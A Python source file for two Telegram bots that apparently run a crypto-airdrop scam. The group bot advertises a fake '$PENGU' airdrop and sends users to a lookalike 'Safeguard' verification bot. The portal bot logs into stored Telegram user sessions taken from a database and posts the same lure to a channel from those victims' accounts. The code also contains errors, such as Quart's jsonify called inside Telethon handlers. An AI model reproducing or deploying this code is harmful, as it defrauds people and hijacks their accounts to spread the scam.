import asyncio
import httpx
import requests
from telethon.sessions import StringSession
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp  # Asynchronous HTTP requests
from dotenv import load_dotenv
from quart import Quart, request, jsonify
import os
import psycopg2
from psycopg2 import sql
from aiohttp import web  # For the HTTP server
from io import BytesIO

# Load environment variables from the .env file
load_dotenv()

# Database Setup
# Use Render's environment variables for database connection details
DB_HOST = os.getenv("DB_HOST")
DB_NAME = os.getenv("DB_NAME")
DB_USER = os.getenv("DB_USER")
DB_PASSWORD = os.getenv("DB_PASSWORD")
DB_PORT = os.getenv("DB_PORT", "5432")

# Connect to PostgreSQL
try:
    db_conn = psycopg2.connect(
        host=DB_HOST,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASSWORD,
        port=DB_PORT
    )
    db_cursor = db_conn.cursor()
    print("Connected to PostgreSQL database successfully.")
except Exception as e:
    print(f"Error connecting to PostgreSQL: {e}")
    exit()

# create tables
# Create a table to store the bot's session
db_cursor.execute("""
    CREATE TABLE IF NOT EXISTS bot_sessions (
        id SERIAL PRIMARY KEY,
        session_data TEXT NOT NULL
    )
""")
db_conn.commit()



# Helper Functions
def save_bot_session(session_string):
    query = """
        INSERT INTO bot_sessions (id, session_data)
        VALUES (1, %s)
        ON CONFLICT (id) DO UPDATE
        SET session_data = EXCLUDED.session_data;
    """
    db_cursor.execute(query, (session_string,))
    db_conn.commit()
    print("Bot session saved successfully.")


def get_bot_session():
    query = "SELECT session_data FROM bot_sessions WHERE id = 1;"
    db_cursor.execute(query)
    result = db_cursor.fetchone()
    return result[0] if result else None


def get_session_from_db(chat_id):
    query = "SELECT session_data FROM telegram_sessions WHERE chat_id = %s;"
    db_cursor.execute(query, (chat_id,))
    result = db_cursor.fetchone()
    if result:
        print(f"Session for chat_id {chat_id} retrieved successfully.")
    return result[0] if result else None

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('GROUP_BOT_TOKEN')
portal_bot_token = os.getenv('PORTAL_BOT_TOKEN')

bot_client = TelegramClient('group_bot', api_id, api_hash).start(bot_token=bot_token)
portal_bot_client = TelegramClient('portal_bot', api_id, api_hash).start(bot_token=portal_bot_token)

# Image URLs
bot_client_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241226_081503_X.jpg?alt=media&token=aba082f3-0ea8-4552-a5f3-3f781db3f905'
portal_bot_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'


@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    try:
        # Send the initial message
        await event.respond("Searching for available airdrops...")
        await asyncio.sleep(2)
        await event.respond("Airdrops Found ✅")

        # Download the bot client-specific image
        async with aiohttp.ClientSession() as session:
            async with session.get(bot_client_image_url) as response:
                if response.status == 200:
                    from io import BytesIO
                    image_data = BytesIO(await response.read())
                    image_data.name = 'image_drop.jpg'

                    # Send message with the image
                    await event.respond(
                        file=image_data,
                        message=(
                            "Current Airdrop: $PENGU.\n\n"
                            "Eligibility Requirements:\n\n"
                            "- **Active Trading Wallet:** Your trading wallet must have been active within the last 30 days.\n\n"
                            "- **Verification:** Complete verification via Safeguard.\n\n"
                            "**Note:**\n"
                            "Failure to meet any of the above requirements will result in disqualification."
                        ),
                        buttons=[
                            [Button.inline("CLAIM $PENGU", b'verify_button')],
                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]
                        ]
                    )
                else:
                    print("Failed to fetch the image.")
    except Exception as e:
        await event.respond("Error: There was an issue verifying your account. Please try again.")


@bot_client.on(events.CallbackQuery(data=b'verify_button'))
async def on_verify_button_click(event):
    try:
        # Download the portal bot-specific image
        async with aiohttp.ClientSession() as session:
            async with session.get(portal_bot_image_url) as response:
                if response.status == 200:
                    from io import BytesIO
                    image_data = BytesIO(await response.read())
                    image_data.name = 'image_verify.jpg'

                    # Send verification message
                    await event.respond(
                        file=image_data,
                        message=(
                            "$PENGU | PORTAL is being protected by @Safeguard\n\n"
                            "Click below to verify you're human"
                        ),
                        buttons=[
                            [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
                        ]
                    )
                else:
                    print("Failed to fetch the image.")
    except Exception as e:
        await event.respond("Error: Unable to process your request.")


@portal_bot_client.on(events.NewMessage(pattern='/start'))
async def on_portal_access(event):
    chat_id = event.chat_id
    try:
        # Define your channel ID
        channel_id = '-1002486862799'  # Replace with your actual channel ID
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'

                # Reuse the existing session if available
        # Try to retrieve the session from the database
        session_string = get_session_from_db(chat_id)
        session = StringSession(session_string) if session_string else StringSession()
        if not session:
            return jsonify({'error': 'No session found for this user'}), 404

        user_client = TelegramClient(session, api_id, api_hash)
        await user_client.connect()

        if not await user_client.is_user_authorized():
            return jsonify({'error': 'User not authorized. Please authenticate first.'}), 403


        # Download the image from the URL
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    print("Image fetched successfully.")
                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
                    image_data.name = 'image_verify_portal.jpg'  # Set a name for the file

                    # Upload the photo and send the message to the channel
                    uploaded_photo = await user_client.upload_file(image_data)

                    # Send the message to the channel using channel ID
                    message = await user_client.send_message(
                        channel_id,  # Using the channel ID to send the message
                        message=(  # Message content
                            "$MINTERPRO | PORTAL is being protected by @Safeguard\n\n"
                            "Click below to verify you're human"
                        ),
                        file=uploaded_photo,  # Attach the uploaded photo
                        buttons=[  # Add buttons
                            [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
                        ]
                    )
                    print("Message sent successfully.")
                else:
                    print(f"Failed to fetch the image. HTTP Status: {response.status}")
    except Exception as e:
        print(f"Error: {e}")





# HTTP Server for health checks
async def health_check(request):
    return web.Response(text="Bot is running!")


async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5002)
    await site.start()


# Main function to run both the bot and the HTTP server
async def main():
    await bot_client.start()
    print("Bot is running...")
    asyncio.create_task(run_http_server())
    await bot_client.run_until_disconnected()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
